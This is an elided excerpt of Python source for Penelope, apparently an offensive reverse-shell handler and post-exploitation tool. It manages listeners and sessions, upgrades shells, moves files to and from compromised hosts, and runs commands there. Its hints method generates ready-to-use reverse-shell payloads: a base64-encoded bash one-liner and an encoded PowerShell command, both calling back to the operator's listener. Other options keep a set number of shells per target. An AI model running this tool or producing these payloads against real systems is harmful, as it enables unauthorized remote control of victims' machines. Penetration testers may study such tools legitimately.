    ...
    def list(self):
        if OS == "Linux":
            if shutil.which("ip"):
                ...
                for line in (
                    subprocess.check_output(["ip", "addr"]).decode().splitlines()
                ):
...
class MainMenu(BetterCMD):
    ...
    def set_id(self, ID):
        self.sid = ID
        session_part = (
            f"{paint('─(').cyan_DIM}{paint('Session').green} {paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
            if self.sid
            else ""
        )
    ...
    def complete_listeners(self, text, line, begidx, endidx):
        ...
        if begidx == 15:
            listeners = [
                re.search(r"\((.*)\)", str(listener))[1].replace(":", " ")
...
class Listener:
    ...
    def hints(self):
        ...
        for ip in ips:
            ...
            output.extend(
                (
                    f"➤  {str(paint(iface_name).GREEN)} → {str(paint(ip).cyan)}:{str(paint(self.port).red)}",
                    "",
                )
            )
            output.append(
                f"echo -n {base64.b64encode(presets[0].format(ip, self.port).encode()).decode()}|base64 -d|bash"
            )
            output.append("")
            output.append(
                "cmd /c powershell -e "
                + base64.b64encode(
                    presets[1].format(ip, self.port).encode("utf-16le")
                ).decode()
            )
...
class Session:
        ...
        if self.determine():
            ...
            if not options.no_log:
                ...
                if not options.no_timestamps and not self.logpath.exists():
                    self.logfile.write(
                        datetime.now()
                        .strftime(paint("%Y-%m-%d %H:%M:%S: ").magenta)
                        .encode()
                    )
        ...
        if self.OS == "Unix":
            if self.agent:
                ...
                if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
                    logger.error(
                        f"Cannot get the PID of the shell. Response: {self.shell_pid}"
                    )
            ...
            if self.OS == "Unix":
                ...
                if self.bsd:
                    self._cwd = self.control_session.exec(
                        f"lsof -a -p {self.shell_pid} -d cwd -Fn 2>/dev/null | grep '^n' | cut -c2-",
                        value=True,
                    )
                elif self.agent:
                    self._cwd = self.exec(
            ...
            if self.OS == "Unix":
                if self.bsd:
                    self._user = self.control_session.exec(
                        f"ps -o user= -p {self.shell_pid}", value=True
                    )
                elif self.agent:
    ...
    def determine(self, path=False):
        ...
        if response:
            ...
            if var_value1 + var_value2 in response:
                ...
                self.prompt = response.splitlines()[-1].encode()
                if (
                    var_name1 in response
                    and not f"echo ${var_name1}${var_name2}" in response
                ):
                    self.type = "PTY"
        ...
        with self.lock:
            ...
            if cmd is not None:
                ...
                if raw:
                    ...
                    if self.OS == "Unix":
                        ...
                        if (
                            self.subtype == "cmd" and len(cmd) > MAX_CMD_PROMPT_LEN
            ...
            if value and self.subchannel.result is not False:
                self.subchannel.result = (
                    self.subchannel.result.strip().decode()
                )  # TODO check strip
            logger.debug(
    ...
    def need_binary(self, name, url):
        ...
        if answer == "1":
            return self.upload(url, remote_path=self.tmp, randomize_fname=False)[0]
            ...
            if local_path:
                if os.path.exists(local_path):
                    return self.upload(
                        local_path, remote_path=self.tmp, randomize_fname=False
                    )[0]
                else:
    ...
    def upgrade(self):
        if self.OS == "Unix":
            ...
            logger.info(
                f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪"
            )
        ...
        if threading.current_thread().name != "Core":
            if self.new:
                ...
                if not options.no_upgrade:
                    if not (
                        self.need_control_session and self.control_sessions == [self]
                    ):
                        self.upgrade()
                self.bypass_control_session = False
    ...
    def download(self, remote_items):
        ...
        if self.OS == "Unix":
            ...
            if self.agent:
                ...
                response = self.exec(
                    f"{inspect.getsource(get_glob_size)}"
    ...
    def upload(self, local_items, remote_path=None, randomize_fname=False):
        ...
        if self.OS == "Unix":
            ...
            if self.agent:
                ...
                remote_block_size = int(
                    self.exec(
                        rf"stat {destination}| sed -n 's/.*IO Block: \([0-9]*\).*/\1/p'",
                        value=True,
                    )
                )
                remote_space = (
        ...
        altnames = list(
            map(
                lambda x: destination + ("/" if self.OS == "Unix" else "\\") + x,
                altnames,
            )
        )
    ...
    def kill(self):
        ...
        if thread_name != "Core":
            if (
                self.need_control_sessions
                and not self.spare_control_sessions
                and self.control_session is self
            ):
                sessions = ", ".join(
                    [str(session.id) for session in self.need_control_sessions]
                )
                if thread_name == "Menu":
                    logger.warning(
                    ...
                    for _type, _value in messages:
                        ...
                        if _type == Messenger.SHELL:
                            ...
                            (
                                ...
                                _value[
                                    Messenger.STREAM_BYTES + 1 : Messenger.STREAM_BYTES
                                    * 2
                                    + 1
                                ],
                                _value[
                                    Messenger.STREAM_BYTES * 2
                                    + 1 : Messenger.STREAM_BYTES * 3 + 1
                                ],
...
class ngrok(Module):
    ...
    def run(session):
        ...
        if session.OS == "Unix":
            ...
            session.exec(
                f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin"
            )
...
class FileServer:
    ...
    def _start(self):
        filemap, host, port, password, quiet = (
            self.filemap,
            self.host,
            self.port,
            self.password,
        ...
        class CustomHandler(SimpleHTTPRequestHandler):
            ...
            def log_message(self, format, *args):
                ...
                logger.info(
                    f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}"
                )
...
def fonts_installed():
    ...
    try:
        if (
            "Noto Color Emoji"
            in subprocess.run(
                ["fc-list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            ).stdout
        ):
            return True
    except:
...
def main():
    ...
    parser.add_argument(
        "ports",
        nargs="*",
        help="Ports to listen/connect to, depending on -i/-c options. Default: 4444",
    )
    ...
    method.add_argument(
        "-i",
        "--interface",
        help="Interface or IP address to listen on. Default: 0.0.0.0",
        metavar="",
    )
    ...
    hints.add_argument(
        "-a",
        "--hints",
        help="Show sample payloads for reverse shell based on the registered Listeners",
        action="store_true",
    )
    hints.add_argument(
        "-l",
        "--interfaces",
        help="Show the available network interfaces",
        action="store_true",
    )
    hints.add_argument(
    ...
    log.add_argument(
        "-T",
        "--no-timestamps",
        help="Do not include timestamps in session logs",
        action="store_true",
    )
    log.add_argument(
        "-CT",
        "--no-colored-timestamps",
        help="Do not color timestamps in session logs",
        action="store_true",
    )
    ...
    misc.add_argument(
        "-m",
        "--maintain",
        help="Maintain NUM total shells per target",
        type=int,
        metavar="",
    )
    misc.add_argument(
    ...
    misc.add_argument(
        "-C",
        "--no-attach",
        help="Disable auto attaching sessions upon creation",
        action="store_true",
    )
    misc.add_argument(
        "-U", "--no-upgrade", help="Do not upgrade shells", action="store_true"
    )
    ...
    debug.add_argument(
        "-N",
        "--no-bins",
        help="Simulate binary absence on target (comma separated list)",
        metavar="",
    )
    debug.add_argument(
        "-v", "--version", help="Show Penelope version", action="store_true"
    )
    ...
    debug.add_argument(
        "-cu",
        "--check-urls",
        help="Check health of hardcoded URLs",
        action="store_true",
    )
